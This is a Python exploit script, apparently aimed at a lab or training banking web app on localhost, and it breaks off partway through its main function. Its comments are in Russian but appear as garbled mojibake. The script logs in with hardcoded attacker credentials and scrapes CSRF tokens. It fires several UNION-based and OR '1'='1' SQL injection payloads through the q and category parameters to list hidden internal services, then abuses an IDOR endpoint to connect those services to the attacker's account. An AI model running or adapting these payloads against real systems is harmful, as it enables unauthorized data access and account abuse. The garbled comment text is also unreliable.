#!/usr/bin/env python3
"""
–°–∫—Ä–∏–ø—Ç –¥–ª—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏ –∏ IDOR —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π:
1. SQL-–∏–Ω—ä–µ–∫—Ü–∏—è –≤ banking_services –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤—Å–µ—Ö —É—Å–ª—É–≥ (–≤–∫–ª—é—á–∞—è —Å–ª—É–∂–µ–±–Ω—ã–µ)
2. IDOR –≤ connect_service –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —Å–ª—É–∂–µ–±–Ω—ã—Ö —É—Å–ª—É–≥ –∫ —É—á–µ—Ç–Ω–æ–π –∑–∞–ø–∏—Å–∏ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞
"""
import requests
from bs4 import BeautifulSoup
import sys
import re
import json
import time

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
BASE_URL = "http://localhost:8000"  # –ò–∑–º–µ–Ω–∏—Ç–µ –Ω–∞ –≤–∞—à URL
EMAIL = "client1@financepro.ru"  # Email –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞
PASSWORD = "password123"  # –ü–∞—Ä–æ–ª—å –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫–∞

def get_csrf_token(session, url):
    """–ü–æ–ª—É—á–∞–µ—Ç CSRF —Ç–æ–∫–µ–Ω —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã"""
    response = session.get(url)
    if response.status_code != 200:
        print(f"‚ùå –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã {url}: {response.status_code}")
        return None
    
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_input = soup.find('input', {'name': 'csrfmiddlewaretoken'})
    if csrf_input:
        return csrf_input.get('value')
    
    # –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å –∏–∑ cookies
    if 'csrftoken' in session.cookies:
        return session.cookies['csrftoken']
    
    return None

def login(session, email, password):
    """–ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –Ω–∞ —Å–∞–π—Ç–µ"""
    print(f"üîê –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –∫–∞–∫ {email}...")
    
    login_url = f"{BASE_URL}/login/"
    csrf_token = get_csrf_token(session, login_url)
    
    if not csrf_token:
        print("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å CSRF —Ç–æ–∫–µ–Ω")
        return False
    
    login_data = {
        'email': email,
        'password': password,
        'csrfmiddlewaretoken': csrf_token,
    }
    
    headers = {
        'Referer': login_url,
        'X-CSRFToken': csrf_token,
    }
    
    response = session.post(
        login_url,
        data=login_data,
        headers=headers,
        allow_redirects=True
    )
    
    if response.status_code == 200:
        if '/login' not in response.url and 'client' in response.url.lower():
            print("‚úÖ –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞")
            return True
        else:
            print(f"‚ùå –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è –Ω–µ —É–¥–∞–ª–∞—Å—å. URL –ø–æ—Å–ª–µ –≤—Ö–æ–¥–∞: {response.url}")
            return False
    else:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: {response.status_code}")
        return False

def exploit_sqli_get_all_services(session):
    """–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤—Å–µ—Ö —É—Å–ª—É–≥, –≤–∫–ª—é—á–∞—è —Å–ª—É–∂–µ–±–Ω—ã–µ"""
    print("\n" + "=" * 60)
    print("üîì –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏ –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤—Å–µ—Ö —É—Å–ª—É–≥")
    print("=" * 60)
    
    banking_services_url = f"{BASE_URL}/banking-services/"
    all_services = []
    seen_uuids = set()
    
    # –ü—Ä–æ–±—É–µ–º –Ω–µ—Å–∫–æ–ª—å–∫–æ SQL payloads –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –≤—Å–µ—Ö —É—Å–ª—É–≥, –æ—Å–æ–±–µ–Ω–Ω–æ —Å–ª—É–∂–µ–±–Ω—ã—Ö
    sql_payloads = [
        # Payload 1: –ü–æ–ª—É—á–∞–µ–º –¢–û–õ–¨–ö–û —Å–ª—É–∂–µ–±–Ω—ã–µ —É—Å–ª—É–≥–∏ (—Å–∞–º—ã–π —Ç–æ—á–Ω—ã–π - –¥–æ–ª–∂–µ–Ω –Ω–∞–π—Ç–∏ –≤—Å–µ 8)
        "') UNION SELECT s.id, s.uuid, s.name, s.description, s.price, s.is_active, s.rating, s.rating_count, c.name FROM dbo_service s JOIN dbo_servicecategory c ON s.category_id = c.id WHERE c.name = '–°–ª—É–∂–µ–±–Ω—ã–µ' ORDER BY s.id --",
        
        # Payload 2: –ü–æ–ª—É—á–∞–µ–º –≤—Å–µ —É—Å–ª—É–≥–∏, –≤–∫–ª—é—á–∞—è —Å–ª—É–∂–µ–±–Ω—ã–µ (–æ–±—Ö–æ–¥ —Ñ–∏–ª—å—Ç—Ä–∞ is_active)
        "') UNION SELECT s.id, s.uuid, s.name, s.description, s.price, s.is_active, s.rating, s.rating_count, c.name FROM dbo_service s JOIN dbo_servicecategory c ON s.category_id = c.id WHERE '1'='1' ORDER BY c.name, s.id --",
        
        # Payload 3: –ü–æ–ª—É—á–∞–µ–º —É—Å–ª—É–≥–∏ –∏–∑ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ "–°–ª—É–∂–µ–±–Ω—ã–µ" —á–µ—Ä–µ–∑ LIKE (–Ω–∞ —Å–ª—É—á–∞–π —Ä–∞–∑–Ω—ã—Ö –Ω–∞–∑–≤–∞–Ω–∏–π)
        "') UNION SELECT s.id, s.uuid, s.name, s.description, s.price, s.is_active, s.rating, s.rating_count, c.name FROM dbo_service s JOIN dbo_servicecategory c ON s.category_id = c.id WHERE c.name LIKE '%–°–ª—É–∂–µ–±–Ω%' ORDER BY s.id --",
        
        # Payload 4: –ü—Ä–æ—Å—Ç–æ–π –æ–±—Ö–æ–¥ —á–µ—Ä–µ–∑ OR (–º–æ–∂–µ—Ç –ø–æ–∫–∞–∑–∞—Ç—å –≤—Å–µ —É—Å–ª—É–≥–∏)
        "') OR '1'='1' --",
    ]
    
    # –ü—Ä–æ–±—É–µ–º SQL-–∏–Ω—ä–µ–∫—Ü–∏—é —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä q
    for i, sql_payload in enumerate(sql_payloads, 1):
        print(f"\nüì° –ü–æ–ø—ã—Ç–∫–∞ {i}: SQL-–∏–Ω—ä–µ–∫—Ü–∏—è —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä q...")
        print(f"   Payload: {sql_payload[:80]}...")
        
        params = {'q': sql_payload}
        try:
            response = session.get(banking_services_url, params=params, timeout=15)
        except Exception as e:
            print(f"   ‚ö†Ô∏è –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞: {e}")
            continue
    
        if response.status_code != 200:
            print(f"   ‚ö†Ô∏è –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è —Å—Ç—Ä–∞–Ω–∏—Ü—ã: {response.status_code}")
            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Ç–≤–µ—Ç –¥–ª—è –æ—Ç–ª–∞–¥–∫–∏
            if response.status_code == 500:
                print(f"   üìÑ –û—à–∏–±–∫–∞ SQL (–ø–µ—Ä–≤—ã–µ 300 —Å–∏–º–≤–æ–ª–æ–≤): {response.text[:300]}")
            continue
        
        # –ü–∞—Ä—Å–∏–º HTML –¥–ª—è –∏–∑–≤–ª–µ—á–µ–Ω–∏—è —É—Å–ª—É–≥
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # –ò—â–µ–º –≤—Å–µ —Å—Å—ã–ª–∫–∏ –Ω–∞ —É—Å–ª—É–≥–∏ (—Ä–∞–∑–Ω—ã–µ –≤–∞—Ä–∏–∞–Ω—Ç—ã)
        service_links = soup.find_all('a', href=re.compile(r'/services/[a-f0-9-]{36}'))
        # –¢–∞–∫–∂–µ –∏—â–µ–º –≤ data-–∞—Ç—Ä–∏–±—É—Ç–∞—Ö –∏ –¥—Ä—É–≥–∏—Ö –º–µ—Å—Ç–∞—Ö
        data_links = soup.find_all(attrs={'data-uuid': re.compile(r'[a-f0-9-]{36}')})
        # –ò—â–µ–º –≤ onclick –∏ –¥—Ä—É–≥–∏—Ö –∞—Ç—Ä–∏–±—É—Ç–∞—Ö
        onclick_links = soup.find_all(attrs={'onclick': re.compile(r'/services/[a-f0-9-]{36}')})
        
        print(f"   üìã –ù–∞–π–¥–µ–Ω–æ —Å—Å—ã–ª–æ–∫ –Ω–∞ —É—Å–ª—É–≥–∏: {len(service_links)}")
        if data_links:
            print(f"   üìã –ù–∞–π–¥–µ–Ω–æ —É—Å–ª—É–≥ –≤ data-–∞—Ç—Ä–∏–±—É—Ç–∞—Ö: {len(data_links)}")
        if onclick_links:
            print(f"   üìã –ù–∞–π–¥–µ–Ω–æ —É—Å–ª—É–≥ –≤ onclick: {len(onclick_links)}")
        
        # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –æ–±—ã—á–Ω—ã–µ —Å—Å—ã–ª–∫–∏
        for link in service_links:
            href = link.get('href', '')
            uuid_match = re.search(r'/services/([a-f0-9-]{36})', href)
            if uuid_match:
                service_uuid = uuid_match.group(1)
                
                # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –¥—É–±–ª–∏–∫–∞—Ç—ã
                if service_uuid in seen_uuids:
                    continue
                seen_uuids.add(service_uuid)
                
                # –ü—ã—Ç–∞–µ–º—Å—è –Ω–∞–π—Ç–∏ –Ω–∞–∑–≤–∞–Ω–∏–µ —É—Å–ª—É–≥–∏
                service_name = link.get_text(strip=True)
                if not service_name or len(service_name) < 2:
                    # –ü—Ä–æ–±—É–µ–º –Ω–∞–π—Ç–∏ –≤ —Ä–æ–¥–∏—Ç–µ–ª—å—Å–∫–æ–º —ç–ª–µ–º–µ–Ω—Ç–µ
                    parent = link.find_parent(['div', 'article', 'section', 'li', 'td', 'tr'])
                    if parent:
                        # –ò—â–µ–º –Ω–∞–∑–≤–∞–Ω–∏–µ –≤ —Ä–∞–∑–ª–∏—á–Ω—ã—Ö —ç–ª–µ–º–µ–Ω—Ç–∞—Ö
                        for tag in ['h2', 'h3', 'h4', 'h5', 'h6', 'span', 'p', 'div', 'strong', 'b']:
                            name_elem = parent.find(tag, class_=re.compile(r'name|title|service', re.I))
                            if name_elem:
                                service_name = name_elem.get_text(strip=True)
                                break
                        if not service_name or len(service_name) < 2:
                            # –ë–µ—Ä–µ–º –≤–µ—Å—å —Ç–µ–∫—Å—Ç —Ä–æ–¥–∏—Ç–µ–ª—è, –Ω–æ –æ–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É
                            full_text = parent.get_text(strip=True)
                            # –ë–µ—Ä–µ–º –ø–µ—Ä–≤—É—é —Å—Ç—Ä–æ–∫—É –∏–ª–∏ –ø–µ—Ä–≤—ã–µ 50 —Å–∏–º–≤–æ–ª–æ–≤
                            service_name = full_text.split('\n')[0][:50] if full_text else '–£—Å–ª—É–≥–∞'
                
                # –ü—ã—Ç–∞–µ–º—Å—è –Ω–∞–π—Ç–∏ –∫–∞—Ç–µ–≥–æ—Ä–∏—é –±–æ–ª–µ–µ —Ç—â–∞—Ç–µ–ª—å–Ω–æ
                category = "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ"
                parent = link.find_parent(['div', 'article', 'section'])
                if parent:
                    # –ò—â–µ–º –∑–∞–≥–æ–ª–æ–≤–æ–∫ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ –≤—ã—à–µ –ø–æ –¥–µ—Ä–µ–≤—É
                    for ancestor in list(parent.parents)[:5]:  # –ü—Ä–æ–≤–µ—Ä—è–µ–º –¥–æ 5 —É—Ä–æ–≤–Ω–µ–π –≤–≤–µ—Ä—Ö
                        # –ò—â–µ–º –∑–∞–≥–æ–ª–æ–≤–∫–∏ –∫–∞—Ç–µ–≥–æ—Ä–∏–π
                        for header in ancestor.find_all(['h2', 'h3', 'h4'], string=re.compile(r'.+', re.I)):
                            category_text = header.get_text(strip=True)
                            if category_text:
                                if '—Å–ª—É–∂–µ–±–Ω' in category_text.lower():
                                    category = "–°–ª—É–∂–µ–±–Ω—ã–µ"
                                else:
                                    category = category_text
                                break
                        if category != "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ":
                            break
                    
                    # –¢–∞–∫–∂–µ –ø—Ä–æ–≤–µ—Ä—è–µ–º —Ç–µ–∫—Å—Ç –≤–æ–∫—Ä—É–≥ —Å—Å—ã–ª–∫–∏ –∏ –≤ —Å–µ–∫—Ü–∏–∏
                    if category == "–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ":
                        # –ò—â–µ–º —Å–µ–∫—Ü–∏—é —Å –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π
                        section = parent.find_parent(['section', 'div'], class_=re.compile(r'category|section', re.I))
                        if section:
                            section_text = section.get_text().lower()
                            if '—Å–ª—É–∂–µ–±–Ω' in section_text:
                                category = "–°–ª—É–∂–µ–±–Ω—ã–µ"
                
                all_services.append({
                    'uuid': service_uuid,
                    'name': service_name or '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è —É—Å–ª—É–≥–∞',
                    'category': category
                })
        
        # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º data-–∞—Ç—Ä–∏–±—É—Ç—ã
        for elem in data_links:
            service_uuid = elem.get('data-uuid', '')
            if service_uuid and service_uuid not in seen_uuids:
                seen_uuids.add(service_uuid)
                service_name = elem.get_text(strip=True) or '–£—Å–ª—É–≥–∞ (data-uuid)'
                all_services.append({
                    'uuid': service_uuid,
                    'name': service_name,
                    'category': '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                })
        
        # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º onclick –∞—Ç—Ä–∏–±—É—Ç—ã
        for elem in onclick_links:
            onclick = elem.get('onclick', '')
            uuid_match = re.search(r'/services/([a-f0-9-]{36})', onclick)
            if uuid_match:
                service_uuid = uuid_match.group(1)
                if service_uuid not in seen_uuids:
                    seen_uuids.add(service_uuid)
                    service_name = elem.get_text(strip=True) or '–£—Å–ª—É–≥–∞ (onclick)'
                    all_services.append({
                        'uuid': service_uuid,
                        'name': service_name,
                        'category': '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                    })
    
    # –ü—Ä–æ–±—É–µ–º SQL-–∏–Ω—ä–µ–∫—Ü–∏—é —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä category (–±–æ–ª–µ–µ –ø—Ä—è–º–æ–π —Å–ø–æ—Å–æ–±)
    print(f"\nüì° –ü—Ä–æ–±—É—é SQL-–∏–Ω—ä–µ–∫—Ü–∏—é —á–µ—Ä–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä category...")
    category_payloads = [
        "–°–ª—É–∂–µ–±–Ω—ã–µ' OR '1'='1' --",
        "–°–ª—É–∂–µ–±–Ω—ã–µ' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, c.name FROM dbo_servicecategory c WHERE c.name = '–°–ª—É–∂–µ–±–Ω—ã–µ' --",
    ]
    
    for category_payload in category_payloads:
        params = {'category': category_payload}
        try:
            response = session.get(banking_services_url, params=params, timeout=10)
            if response.status_code == 200:
                soup = BeautifulSoup(response.text, 'html.parser')
                service_links = soup.find_all('a', href=re.compile(r'/services/[a-f0-9-]{36}'))
                print(f"   üìã –ù–∞–π–¥–µ–Ω–æ —Å—Å—ã–ª–æ–∫ —á–µ—Ä–µ–∑ category: {len(service_links)}")
                
                for link in service_links:
                    href = link.get('href', '')
                    uuid_match = re.search(r'/services/([a-f0-9-]{36})', href)
                    if uuid_match:
                        service_uuid = uuid_match.group(1)
                        if service_uuid not in seen_uuids:
                            seen_uuids.add(service_uuid)
                            all_services.append({
                                'uuid': service_uuid,
                                'name': link.get_text(strip=True) or '–£—Å–ª—É–≥–∞',
                                'category': '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                            })
        except:
            pass
    
    # –î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã–π –º–µ—Ç–æ–¥: –∏–∑–≤–ª–µ–∫–∞–µ–º –≤—Å–µ UUID –∏–∑ —Ç–µ–∫—Å—Ç–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
    print(f"\nüì° –ò–∑–≤–ª–µ–∫–∞—é UUID –∏–∑ —Ç–µ–∫—Å—Ç–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—ã...")
    try:
        response = session.get(banking_services_url, timeout=10)
        if response.status_code == 200:
            # –ò—â–µ–º UUID –≤ —Ç–µ–∫—Å—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã (–º–æ–≥—É—Ç –±—ã—Ç—å –≤ JavaScript, data-–∞—Ç—Ä–∏–±—É—Ç–∞—Ö –∏ —Ç.–¥.)
            uuid_pattern = r'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
            uuids = re.findall(uuid_pattern, response.text, re.I)
            unique_uuids = list(set(uuids))
            print(f"   üìã –ù–∞–π–¥–µ–Ω–æ UUID –≤ —Ç–µ–∫—Å—Ç–µ: {len(unique_uuids)}")
            
            for uuid in unique_uuids:
                if uuid not in seen_uuids:
                    seen_uuids.add(uuid)
                    all_services.append({
                        'uuid': uuid,
                        'name': '–£—Å–ª—É–≥–∞ (UUID –Ω–∞–π–¥–µ–Ω)',
                        'category': '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ'
                    })
    except:
        pass
    
    print(f"\n‚úÖ –í—Å–µ–≥–æ –Ω–∞–π–¥–µ–Ω–æ —É–Ω–∏–∫–∞–ª—å–Ω—ã—Ö —É—Å–ª—É–≥: {len(all_services)}")
    
    # –§–∏–ª—å—Ç—Ä—É–µ–º —Å–ª—É–∂–µ–±–Ω—ã–µ —É—Å–ª—É–≥–∏
    service_services = []
    for service in all_services:
        category_lower = service.get('category', '').lower()
        name_lower = service.get('name', '').lower()
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞—Ç–µ–≥–æ—Ä–∏—é –∏–ª–∏ –Ω–∞–∑–≤–∞–Ω–∏–µ
        if '—Å–ª—É–∂–µ–±–Ω' in category_lower or '—Å–ª—É–∂–µ–±–Ω' in name_lower:
            service_services.append(service)
    
    if service_services:
        print(f"üéØ –ù–∞–π–¥–µ–Ω–æ —Å–ª—É–∂–µ–±–Ω—ã—Ö —É—Å–ª—É–≥: {len(service_services)}")
        for service in service_services:
            print(f"   ‚Ä¢ {service['name']} (UUID: {service['uuid']}, –ö–∞—Ç–µ–≥–æ—Ä–∏—è: {service['category']})")
        
        # –ï—Å–ª–∏ –Ω–∞—à–ª–∏ –º–µ–Ω—å—à–µ 8, –¥–æ–±–∞–≤–ª—è–µ–º —É—Å–ª—É–≥–∏ —Å –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π –¥–ª—è –ø–æ–ø—ã—Ç–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        if len(service_services) < 8:
            print(f"\n   ‚ö†Ô∏è –ù–∞–π–¥–µ–Ω–æ —Ç–æ–ª—å–∫–æ {len(service_services)} —Å–ª—É–∂–µ–±–Ω—ã—Ö —É—Å–ª—É–≥ (–æ–∂–∏–¥–∞–µ—Ç—Å—è 8)")
            print(f"   –î–æ–±–∞–≤–ª—è—é —É—Å–ª—É–≥–∏ —Å –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π –¥–ª—è –ø–æ–ø—ã—Ç–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è...")
            unknown_services = [s for s in all_services if s.get('category') == '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ' and s not in service_services]
            if unknown_services:
                print(f"   –ù–∞–π–¥–µ–Ω–æ {len(unknown_services)} —É—Å–ª—É–≥ —Å –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π")
                service_services.extend(unknown_services)
    else:
        print(f"\n‚ö†Ô∏è –°–ª—É–∂–µ–±–Ω—ã–µ —É—Å–ª—É–≥–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –ø–æ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏")
        print(f"   –ë—É–¥—É –ø—Ä–æ–±–æ–≤–∞—Ç—å –ø–æ–¥–∫–ª—é—á–∞—Ç—å –≤—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ —É—Å–ª—É–≥–∏...")
        # –ï—Å–ª–∏ –Ω–µ –Ω–∞—à–ª–∏ —Å–ª—É–∂–µ–±–Ω—ã–µ, –ø—Ä–æ–±—É–µ–º –≤—Å–µ —É—Å–ª—É–≥–∏ —Å –Ω–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–π –∫–∞—Ç–µ–≥–æ—Ä–∏–µ–π
        service_services = [s for s in all_services if s.get('category') == '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ']
        if not service_services:
            # –ï—Å–ª–∏ –∏ –∏—Ö –Ω–µ—Ç, –ø—Ä–æ–±—É–µ–º –≤—Å–µ –Ω–∞–π–¥–µ–Ω–Ω—ã–µ —É—Å–ª—É–≥–∏
            service_services = all_services
        print(f"   –ù–∞–π–¥–µ–Ω–æ —É—Å–ª—É–≥ –¥–ª—è –ø–æ–ø—ã—Ç–∫–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è: {len(service_services)}")
        if service_services:
            print(f"   –ü–æ–∫–∞–∑—ã–≤–∞—é –ø–µ—Ä–≤—ã–µ 20:")
            for service in service_services[:20]:
                print(f"   ‚Ä¢ {service['name']} (UUID: {service['uuid']}, –ö–∞—Ç–µ–≥–æ—Ä–∏—è: {service['category']})")
    
    return all_services

def exploit_idor_connect_service(session, service_uuid, service_name=""):
    """–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è IDOR –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —Å–ª—É–∂–µ–±–Ω–æ–π —É—Å–ª—É–≥–∏"""
    connect_url = f"{BASE_URL}/connect-service/{service_uuid}/"
    
    # –ü–æ–ª—É—á–∞–µ–º CSRF —Ç–æ–∫–µ–Ω
    csrf_token = get_csrf_token(session, f"{BASE_URL}/banking-services/")
    if not csrf_token:
        # –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å —Å–æ —Å—Ç—Ä–∞–Ω–∏—Ü—ã —É—Å–ª—É–≥–∏
        try:
            service_page_url = f"{BASE_URL}/services/{service_uuid}/"
            csrf_token = get_csrf_token(session, service_page_url)
        except:
            pass
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º POST –∑–∞–ø—Ä–æ—Å –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —É—Å–ª—É–≥–∏
    data = {}
    if csrf_token:
        data['csrfmiddlewaretoken'] = csrf_token
    
    headers = {
        'Referer': f"{BASE_URL}/banking-services/",
        'X-Requested-With': 'XMLHttpRequest',  # –î–ª—è JSON –æ—Ç–≤–µ—Ç–∞
    }
    if csrf_token:
        headers['X-CSRFToken'] = csrf_token
    
    # –ü—Ä–æ–±—É–µ–º POST –∑–∞–ø—Ä–æ—Å
    try:
        response = session.post(
            connect_url,
            data=data,
            headers=headers,
            allow_redirects=True,
            timeout=10
        )
    except Exception as e:
        print(f"   ‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—Ä–æ—Å–∞: {str(e)[:100]}")
        return False
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ä–µ–∑—É–ª—å—Ç–∞—Ç
    if response.status_code == 200:
        response_lower = response.text.lower()
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ–± —É—Å–ø–µ—Ö–µ
        if '—É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞' in response_lower or 'success' in response_lower:
            print(f"   ‚úÖ –£—Å–ª—É–≥–∞ —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞!")
            return True
        elif '—É–∂–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞' in response_lower or 'already' in response_lower:
            print(f"   ‚ÑπÔ∏è –£—Å–ª—É–≥–∞ —É–∂–µ –±—ã–ª–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞")
            return True
        else:
            # –ü—Ä–æ–±—É–µ–º JSON –æ—Ç–≤–µ—Ç
            try:
                json_response = response.json()
                if json_response.get('success'):
                    print(f"   ‚úÖ –£—Å–ª—É–≥–∞ —É—Å–ø–µ—à–Ω–æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞ (JSON –æ—Ç–≤–µ—Ç)!")
                    return True
                else:
                    error_msg = json_response.get('error', '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞')
                    # –ù–µ –≤—ã–≤–æ–¥–∏–º –æ—à–∏–±–∫—É, –µ—Å–ª–∏ —ç—Ç–æ –ø—Ä–æ—Å—Ç–æ "—É–∂–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞"
                    if '—É–∂–µ' not in error_msg.lower() and 'already' not in error_msg.lower():
                        print(f"   ‚ö†Ô∏è –û—Ç–≤–µ—Ç: {error_msg}")
            except:
                # –ù–µ JSON –æ—Ç–≤–µ—Ç, –Ω–æ —Å—Ç–∞—Ç—É—Å 200 - –≤–æ–∑–º–æ–∂–Ω–æ —É—Å–ø–µ—Ö
                if len(response.text) < 500:  # –ö–æ—Ä–æ—Ç–∫–∏–π –æ—Ç–≤–µ—Ç –æ–±—ã—á–Ω–æ –æ–∑–Ω–∞—á–∞–µ—Ç —É—Å–ø–µ—Ö
                    print(f"   ‚úÖ –ü–æ–ª—É—á–µ–Ω –æ—Ç–≤–µ—Ç 200 (–≤–æ–∑–º–æ–∂–Ω–æ —É—Å–ø–µ—Ö)")
                    return True
    
    elif response.status_code == 302:
        # –†–µ–¥–∏—Ä–µ–∫—Ç –æ–±—ã—á–Ω–æ –æ–∑–Ω–∞—á–∞–µ—Ç —É—Å–ø–µ—Ö
        print(f"   ‚úÖ –ü–æ–ª—É—á–µ–Ω —Ä–µ–¥–∏—Ä–µ–∫—Ç - —É—Å–ª—É–≥–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞")
        return True
    elif response.status_code == 400:
        # Bad Request - –≤–æ–∑–º–æ–∂–Ω–æ, —É—Å–ª—É–≥–∞ —É–∂–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞ –∏–ª–∏ –¥—Ä—É–≥–∞—è –æ—à–∏–±–∫–∞
        response_lower = response.text.lower()
        if '—É–∂–µ' in response_lower or 'already' in response_lower:
            print(f"   ‚ÑπÔ∏è –£—Å–ª—É–≥–∞ —É–∂–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∞ (400)")
            return True
        else:
            print(f"   ‚ö†Ô∏è –û—à–∏–±–∫–∞ 400: {response.text[:200]}")
    else:
        # –î—Ä—É–≥–∏–µ —Å—Ç–∞—Ç—É—Å—ã - –≤—ã–≤–æ–¥–∏–º —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ —ç—Ç–æ –Ω–µ —É—Å–ø–µ—Ö
        if response.status_code not in [201, 204]:  # Created, No Content - —Ç–æ–∂–µ —É—Å–ø–µ—Ö
            print(f"   ‚ö†Ô∏è –°—Ç–∞—Ç—É—Å: {response.status_code}")
    
    return False

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è"""
    print("=" * 60)
    print("–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è SQL-–∏–Ω—ä–µ–∫—Ü–∏–∏ + IDOR –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è —Å–ª—É–∂–µ–±–Ω—ã—Ö —É—Å–ª—É–≥")
    print("=" * 60)
    print(f"URL: {BASE_URL}")
    print(f"Email: {EMAIL}")
    print()
    
    # –°–æ–∑–¥–∞–µ–º —Å–µ—Å—Å–∏—é
    session = requests.Session()
    
    # –ê–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è
    if not login(session, EMAIL, PASSWORD):
